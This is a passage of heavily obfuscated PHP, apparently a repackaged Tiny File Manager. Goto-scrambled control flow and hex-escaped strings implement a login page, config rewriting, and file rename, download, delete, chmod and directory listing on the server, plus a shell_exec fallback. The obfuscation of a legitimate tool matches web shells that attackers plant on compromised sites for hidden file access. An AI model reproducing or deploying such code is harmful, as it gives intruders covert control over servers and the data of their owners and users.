(is_writable($fm_file)) { $lines = file($fm_file); if ($fh = @fopen($fm_file, "\x77")) { @fputs($fh, $config_string, strlen($config_string)); for ($x = 3; $x < count($lines); $x++) { @fputs($fh, $lines[$x], strlen($lines[$x])); } @fclose($fh); } } } } goto P4__x; EGz8a: if (!empty($files)) { natcasesort($files); } goto Vk3Hy; CpW9N: $root_path = str_replace("\x5c", "\57", $root_path); goto ZLvwG; Ik9Jr: function fm_show_footer_login() { ?>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.slim.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    </body>
    </html>
    <?php  } goto K97zT; g6FZw: defined("\x46\x4d\137\x49\x43\117\116\126\137\x49\116\x50\125\x54\137\105\116\x43") || define("\x46\115\x5f\x49\103\117\x4e\x56\137\111\116\x50\x55\x54\x5f\105\x4e\103", $iconv_input_encoding); goto De86c; A7iLO: function fm_show_header_login() { $sprites_ver = "\62\x30\61\66\x30\x33\x31\65"; header("\103\x6f\156\164\x65\x6e\164\55\124\x79\160\x65\x3a\40\x74\145\x78\x74\x2f\150\164\x6d\x6c\x3b\40\143\x68\141\162\x73\145\164\x3d\165\x74\x66\55\x38"); header("\105\x78\160\x69\x72\x65\163\x3a\x20\x53\141\x74\54\40\x32\66\x20\112\x75\x6c\x20\x31\x39\71\67\x20\x30\65\x3a\60\x30\72\x30\60\40\x47\x4d\x54"); header("\x43\x61\143\x68\145\55\x43\x6f\156\x74\162\x6f\x6c\x3a\40\x6e\x6f\x2d\x73\x74\x6f\162\x65\x2c\40\156\157\x2d\143\x61\143\x68\145\x2c\x20\x6d\165\163\164\55\162\145\x76\x61\x6c\151\144\x61\x74\x65\54\x20\160\157\163\x74\x2d\143\150\x65\x63\153\75\x30\x2c\x20\160\x72\x65\55\143\x68\x65\143\x6b\75\60"); header("\x50\x72\x61\147\155\141\72\x20\156\157\x2d\143\141\x63\150\x65"); global $lang, $root_url, $favicon_path; ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        <meta name="author" content="CCP Programmers">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <?php  if ($favicon_path) { echo "\x3c\x6c\151\x6e\x6b\x20\162\x65\154\x3d\42\151\143\x6f\x6e\x22\x20\x68\162\145\x66\x3d\42" . fm_enc($favicon_path) . "\42\40\x74\171\160\145\x3d\x22\x69\x6d\141\147\145\x2f\160\x6e\147\x22\76"; } ?>
        <title><?php  echo fm_enc(APP_TITLE); ?>
</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
            .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
            .fm-login-page .brand img{ width:100%}
            .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
            .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
            .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
            .fm-login-page .form-control{ border-width:2.3px}
            .fm-login-page .form-group label{ width:100%}
            .fm-login-page .btn.btn-block{ padding:12px 10px}
            .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
            @media screen and (max-width:425px){
                .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
            }
            @media screen and (max-width:320px){
                .fm-login-page .card.fat{ padding:0}
                .fm-login-page .card.fat .card-body{ padding:15px}
            }
            .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
            .message.ok{ border-color:green;color:green}
            .message.error{ border-color:red;color:red}
            .message.alert{ border-color:orange;color:orange}
            body.fm-login-page.theme-dark {background-color: #2f2a2a;}
            .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
        </style>
    </head>
    <body class="fm-login-page <?php  echo FM_THEME == "\x64\x61\x72\153" ? "\x74\150\145\155\x65\x2d\x64\x61\162\x6b" : ''; ?>
">
    <div id="wrapper" class="container-fluid">

        <?php  } goto Ik9Jr; uN1P8: if (isset($_GET["\154\157\147\x6f\165\164"])) { unset($_SESSION[FM_SESSION_ID]["\x6c\157\x67\x67\145\144"]); fm_redirect(FM_SELF_URL); } goto N8VzF; sJXPL: if (empty($auth_users)) { $use_auth = false; } goto tiCv2; O6YKO: function fm_get_text_exts() { return array("\x74\170\x74", "\x63\x73\163", "\x69\156\151", "\143\157\x6e\x66", "\154\157\x67", "\150\164\141\143\x63\x65\163\163", "\x70\x61\x73\x73\x77\144", "\146\164\x70\x71\x75\x6f\x74\x61", "\163\x71\154", "\152\163", "\152\163\157\156", "\x73\150", "\x63\x6f\x6e\146\x69\147", "\160\x68\160", "\160\x68\160\x34", "\x70\x68\x70\65", "\160\x68\160\x73", "\x70\x68\164\x6d\154", "\150\x74\x6d", "\150\x74\x6d\x6c", "\x73\150\x74\155\x6c", "\170\x68\x74\x6d\x6c", "\x78\x6d\x6c", "\x78\163\154", "\x6d\x33\x75", "\155\x33\x75\x38", "\x70\154\x73", "\x63\x75\x65", "\x65\155\x6c", "\155\x73\x67", "\143\x73\166", "\142\141\x74", "\164\x77\x69\147", "\164\x70\154", "\155\144", "\x67\151\164\151\147\156\x6f\162\145", "\x6c\145\x73\x73", "\163\x61\163\x73", "\163\143\x73\x73", "\x63", "\143\x70\160", "\143\163", "\160\171", "\x6d\x61\x70", "\154\157\x63\153", "\x64\x74\144", "\x73\166\x67", "\x73\143\163\163", "\141\163\x70", "\141\x73\160\170", "\141\163\170", "\x61\x73\x6d\x78", "\141\x73\x68\x78", "\152\163\170", "\152\x73\x70", "\x6a\x73\x70\x78", "\x63\146\155", "\x63\x67\x69"); } goto Tn26q; Uy8A2: $files = array(); goto RPd6d; P3sXW: $max_upload_size_bytes = 5000; goto yOTCd; KeBqA: if (isset($_GET["\162\x65\156"], $_GET["\x74\x6f"]) && !FM_READONLY) { $old = $_GET["\162\145\x6e"]; $old = fm_clean_path($old); $old = str_replace("\x2f", '', $old); $new = $_GET["\x74\x6f"]; $new = fm_clean_path(strip_tags($new)); $new = str_replace("\x2f", '', $new); $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } if (fm_isvalid_filename($new) && $old != '' && $new != '') { if (fm_rename($path . "\x2f" . $old, $path . "\57" . $new)) { fm_set_msg(sprintf(lng("\x52\145\x6e\141\x6d\x65\144\x20\146\x72\157\x6d") . "\x20\x3c\142\76\45\x73\74\x2f\x62\x3e\x20" . lng("\x74\x6f") . "\40\x3c\142\76\x25\163\x3c\x2f\x62\76", fm_enc($old), fm_enc($new))); } else { fm_set_msg(sprintf(lng("\105\x72\x72\157\162\x20\x77\x68\151\154\x65\x20\x72\x65\156\141\155\x69\x6e\147\40\x66\162\157\x6d") . "\x20\x3c\142\x3e\x25\163\74\57\x62\x3e\40" . lng("\164\157") . "\x20\x3c\142\76\x25\x73\x3c\57\142\x3e", fm_enc($old), fm_enc($new)), "\x65\162\x72\x6f\162"); } } else { fm_set_msg(lng("\111\x6e\x76\141\x6c\151\144\x20\x63\150\x61\162\141\x63\x74\x65\162\x73\x20\x69\156\x20\x66\x69\x6c\145\40\x6e\141\x6d\145"), "\145\x72\162\x6f\162"); } fm_redirect(FM_SELF_URL . "\77\x70\75" . urlencode(FM_PATH)); } goto z5FpI; VQfxt: define("\101\x50\x50\x5f\x54\111\124\x4c\105", "\x46\x69\x6c\145\40\x4d\x61\156\141\x67\x65\162"); goto FGvAx; KL0_4: $root_url = fm_clean_path($root_url); goto QAp6i; riVzX: ?>
    <form action="" method="post" class="pt-3">
        <input type="hidden" name="p" value="<?php  goto g69k_; YDEmM: function fm_get_mime_type($file_path) { if (function_exists("\x66\x69\x6e\x66\x6f\x5f\x6f\160\x65\156")) { $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $file_path); finfo_close($finfo); return $mime; } elseif (function_exists("\155\151\x6d\145\137\143\157\x6e\164\x65\x6e\x74\137\x74\x79\160\145")) { return mime_content_type($file_path); } elseif (!stristr(ini_get("\x64\x69\163\x61\x62\x6c\145\137\x66\165\156\x63\x74\x69\x6f\156\163"), "\163\150\145\x6c\x6c\x5f\x65\x78\145\143")) { $file = escapeshellarg($file_path); $mime = shell_exec("\x66\x69\154\x65\40\55\142\x69\x20" . $file); return $mime; } else { return "\x2d\55"; } } goto jMH8G; z4C0M: function fm_get_video_exts() { return array("\x61\x76\x69", "\x77\x65\142\x6d", "\167\155\x76", "\x6d\160\x34", "\155\64\x76", "\157\147\x6d", "\x6f\147\x76", "\x6d\157\x76", "\x6d\153\x76"); } goto UcM8h; xLqxJ: function fm_rename($old, $new) { $isFileAllowed = fm_is_valid_ext($new); if (!$isFileAllowed) { return false; } return !file_exists($new) && file_exists($old) ? rename($old, $new) : null; } goto vHW8m; qC_59: defined("\x46\x4d\x5f\x55\x50\114\117\101\x44\137\105\130\x54\x45\116\x53\x49\x4f\x4e") || define("\x46\x4d\137\x55\120\x4c\117\101\104\137\x45\x58\x54\x45\x4e\123\x49\x4f\x4e", $allowed_upload_extensions); goto KFcCr; Vk3Hy: if (!empty($folders)) { natcasesort($folders); } goto iVQCZ; r5oY5: if (is_readable($config_file)) { @(include $config_file); } goto kKT8i; xiiiP: defined("\x46\x4d\x5f\104\117\103\x5f\126\x49\105\x57\x45\x52") || define("\x46\115\x5f\104\x4f\103\x5f\126\111\105\127\105\122", $online_viewer); goto AzmKV; jxFIX: function fm_download_file($fileLocation, $fileName, $chunkSize = 1024) { if (connection_status() != 0) { return false; } $extension = pathinfo($fileName, PATHINFO_EXTENSION); $contentType = fm_get_file_mimes($extension); header("\x43\141\x63\150\x65\55\x43\x6f\x6e\164\162\157\154\72\40\x70\165\142\154\x69\x63"); header("\x43\157\x6e\164\x65\x6e\164\55\124\x72\x61\x6e\x73\146\145\x72\x2d\x45\x6e\143\x6f\144\151\156\147\x3a\x20\x62\151\156\x61\162\x79\xa"); header("\103\x6f\x6e\164\x65\156\x74\x2d\124\x79\160\x65\72\40\x24\143\x6f\156\x74\x65\156\164\124\x79\x70\x65"); $contentDisposition = "\141\164\164\x61\143\150\155\145\156\x74"; if (strstr($_SERVER["\x48\124\x54\x50\137\125\x53\x45\122\x5f\x41\107\105\116\124"], "\115\x53\x49\x45")) { $fileName = preg_replace("\x2f\x5c\56\57", "\45\62\145", $fileName, substr_count($fileName, "\56") - 1); header("\103\x6f\x6e\x74\145\156\x74\55\104\151\163\160\157\163\151\x74\151\x6f\156\72\x20{$contentDisposition}\x3b\x66\151\x6c\145\x6e\x61\x6d\145\x3d\x22{$fileName}\42"); } else { header("\x43\x6f\x6e\x74\145\156\x74\55\x44\x69\163\160\x6f\x73\151\x74\x69\x6f\x6e\x3a\x20{$contentDisposition}\73\x66\x69\x6c\145\x6e\x61\155\145\x3d\x22{$fileName}\x22"); } header("\x41\x63\x63\x65\160\x74\x2d\x52\141\x6e\147\x65\x73\72\40\142\x79\164\145\163"); $range = 0; $size = filesize($fileLocation); if (isset($_SERVER["\110\x54\124\120\x5f\122\x41\116\107\105"])) { list($a, $range) = explode("\75", $_SERVER["\110\x54\124\x50\x5f\x52\x41\x4e\x47\105"]); str_replace($range, "\55", $range); $size2 = $size - 1; $new_length = $size - $range; header("\110\124\x54\120\57\61\x2e\61\x20\x32\x30\x36\x20\120\141\162\164\x69\141\154\40\x43\157\156\164\145\156\164"); header("\x43\x6f\x6e\x74\145\156\x74\55\114\x65\x6e\x67\164\150\x3a\x20{$new_length}"); header("\x43\157\x6e\x74\x65\x6e\164\x2d\122\141\156\147\x65\x3a\40\x62\x79\164\145\x73\40{$range}{$size2}\57{$size}"); } else { $size2 = $size - 1; header("\103\x6f\156\x74\145\156\164\x2d\x52\x61\156\x67\x65\x3a\40\x62\x79\x74\x65\163\40\60\55{$size2}\57{$size}"); header("\103\x6f\156\x74\x65\x6e\x74\x2d\114\145\156\147\164\150\72\x20" . $size); } if ($size == 0) { die("\x5a\145\162\157\40\142\x79\164\x65\40\146\151\x6c\x65\x21\x20\101\x62\x6f\x72\x74\x69\x6e\x67\40\144\x6f\167\156\154\x6f\141\144"); } @ini_set("\x6d\141\147\151\143\x5f\x71\x75\x6f\x74\x65\x73\x5f\x72\165\x6e\x74\x69\155\145", 0); $fp = fopen("{$fileLocation}", "\x72\142"); fseek($fp, $range); while (!feof($fp) and connection_status() == 0) { set_time_limit(0); print @fread($fp, 1024 * $chunkSize); flush(); ob_flush(); } fclose($fp); return connection_status() == 0 and !connection_aborted(); } goto SpgEb; dg5fv: $sticky_navbar = true; goto P3sXW; t4YyM: if ($report_errors == true) { @ini_set("\145\162\x72\157\162\137\x72\145\160\x6f\x72\x74\151\x6e\x67", E_ALL); @ini_set("\x64\x69\x73\160\154\141\171\x5f\145\162\x72\157\x72\x73", 1); } else { @ini_set("\x65\162\162\x6f\x72\137\x72\145\x70\x6f\x72\164\151\x6e\147", E_ALL); @ini_set("\x64\x69\x73\160\154\141\x79\137\x65\x72\162\157\162\163", 0); } goto WUNGH; iyoVj: ?>
        </div>

    </form>

<?php  goto htTgJ; fKVAB: $objects = is_readable($path) ? scandir($path) : array(); goto kPf7e; g0FBu: foreach ($files as $f) { $is_link = is_link($path . "\x2f" . $f); $img = $is_link ? "\146\x61\x20\146\141\55\146\151\x6c\x65\55\164\145\170\x74\x2d\x6f" : fm_get_file_icon_class($path . "\57" . $f); $modif_raw = filemtime($path . "\57" . $f); $modif = date(FM_DATETIME_FORMAT, $modif_raw); $filesize_raw = fm_get_size($path . "\x2f" . $f); $filesize = fm_get_filesize($filesize_raw); $filelink = "\x3f\160\x3d" . urlencode(FM_PATH) . "\x26\141\x6d\x70\73\166\x69\145\x77\x3d" . urlencode($f); $all_files_size += $filesize_raw; $perms = substr(decoct(fileperms($path . "\x2f" . $f)), -4); if (function_exists("\x70\x6f\163\x69\170\x5f\147\x65\164\x70\167\x75\151\144") && function_exists("\x70\157\163\x69\170\x5f\x67\145\x74\147\162\x67\151\x64")) { $owner = posix_getpwuid(fileowner($path . "\x2f" . $f)); $group = posix_getgrgid(filegroup($path . "\57" . $f)); } else { $owner = array("\156\141\155\145" => "\77"); $group = array("\156\141\x6d\145" => "\x3f"); } ?>
                    <tr>
                        <?php  if (!FM_READONLY) { ?>
                            <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php  echo $ik; ?>
" name="file[]" value="<?php  echo fm_enc($f); ?>
">
                                <label class="custom-control-label" for="<?php  echo $ik; ?>
"></label>
                            </div>
                            </td><?php  } ?>
                        <td>
                            <div class="filename">
                                <?php  if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array("\x67\151\x66", "\152\160\147", "\x6a\x70\145\x67", "\x70\x6e\147", "\142\155\x70", "\151\143\x6f", "\x73\166\147", "\167\x65\142\x70", "\x61\166\x69\x66"))) { ?>
                                <?php  $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $f); ?>
                                <a href="<?php  echo $filelink; ?>
" data-preview-image="<?php  echo $imagePreview; ?>
" title="<?php  echo fm_enc($f); ?>
">
                                    <?php  } else { ?>
                                    <a href="<?php  echo $filelink; ?>
" title="<?php  echo $f; ?>
">
                                        <?php  } ?>
                                        <i class="<?php  echo $img; ?>
"></i> <?php  echo fm_convert_win(fm_enc($f)); ?>
                                    </a>
                                    <?php  echo $is_link ? "\40\46\x72\141\162\162\73\40\74\x69\76" . readlink($path . "\x2f" . $f) . "\x3c\x2f\x69\x3e" : ''; ?>
                            </div>
                        </td>
                        <td data-sort=b-"<?php  echo str_pad($filesize_raw, 18, "\60", STR_PAD_LEFT); ?>
"><span title="<?php  printf("\45\x73\40\x62\x79\x74\x65\x73", $filesize_raw); ?>
">
                        <?php  echo $filesize; ?>
                        </span></td>
                        <td data-sort="b-<?php  echo $modif_raw; ?>
"><?php  echo $modif; ?>
</td>
                        <?php  if (!FM_IS_WIN && !$hide_Cols) { ?>
                            <td><?php  if (!FM_READONLY) { ?>
<a title="<?php  echo "\103\x68\x61\156\x67\x65\x20\x50\145\x72\x6d\151\x73\x73\151\x6f\x6e\x73"; ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;chmod=<?php  echo urlencode($f); ?>
"><?php  echo $perms; ?>
</a><?php  } else { echo $perms; } ?>
                            </td>
                            <td><?php  echo fm_enc($owner["\156\x61\x6d\x65"] . "\x3a" . $group["\156\x61\155\145"]); ?>
</td>
                        <?php  } ?>
                        <td class="inline-actions">
                            <a title="<?php  echo lng("\x50\x72\145\x76\x69\145\x77"); ?>
" href="<?php  echo $filelink . "\x26\x71\x75\x69\143\153\x56\151\x65\x77\x3d\x31"; ?>
" data-toggle="lightbox" data-gallery="tiny-gallery" data-title="<?php  echo fm_convert_win(fm_enc($f)); ?>
" data-max-width="100%" data-width="100%"><i class="fa fa-eye"></i></a>
                            <?php  if (!FM_READONLY) { ?>
                                <a title="<?php  echo lng("\104\145\x6c\145\x74\145"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;del=<?php  echo urlencode($f); ?>
" onclick="return confirm('<?php  echo lng("\x44\x65\154\145\x74\145") . "\x20" . lng("\106\151\154\145") . "\77"; ?>
\n \n ( <?php  echo urlencode($f); ?>
 )');"> <i class="fa fa-trash-o"></i></a>
                                <a title="<?php  echo lng("\x52\x65\x6e\x61\155\145"); ?>
" href="#" onclick="rename('<?php  echo fm_enc(addslashes(FM_PATH)); ?>
', '<?php  echo fm_enc(addslashes($f)); ?>
');return false;"><i class="fa fa-pencil-square-o"></i></a>
                                <a title="<?php  echo lng("\103\x6f\x70\171\124\x6f"); ?>
..."
                                   href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode(trim(FM_PATH . "\x2f" . $f, "\57")); ?>
"><i class="fa fa-files-o"></i></a>
                            <?php  } ?>
                            <a title="<?php  echo lng("\104\x69\162\x65\143\164\x4c\151\x6e\x6b"); ?>
" href="<?php  echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $f); ?>
" target="_blank"><i class="fa fa-link"></i></a>
                            <a title="<?php  echo lng("\x44\x6f\x77\x6e\154\157\141\x64"); ?>
" href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;dl=<?php  echo urlencode($f); ?>
"><i class="fa fa-download"></i></a>
                        </td>
                    </tr>
                    <?php  flush(); $ik++; } goto FUUhI; P4__x: function fm_show_nav_path($path) { global $lang, $sticky_navbar; $isStickyNavBar = $sticky_navbar ? "\146\151\170\x65\144\x2d\164\157\x70" : ''; $getTheme = fm_get_theme(); $getTheme .= "\x20\156\141\x76\142\141\x72\55\x6c\151\147\150\x74"; if (FM_THEME == "\x64\x61\162\153") { $getTheme .= "\40\x6e\141\x76\x62\x61\162\x2d\144\x61\162\153"; } else { $getTheme .= "\40\142\x67\55\x77\150\151\164\x65"; } ?>
    <nav class="navbar navbar-expand-lg <?php  echo $getTheme; ?>
 mb-4 main-nav <?php  echo $isStickyNavBar; ?>
">
        <a class="navbar-brand" href=""> <?php  echo lng("\x41\160\x70\124\151\164\154\x65"); ?>
 </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

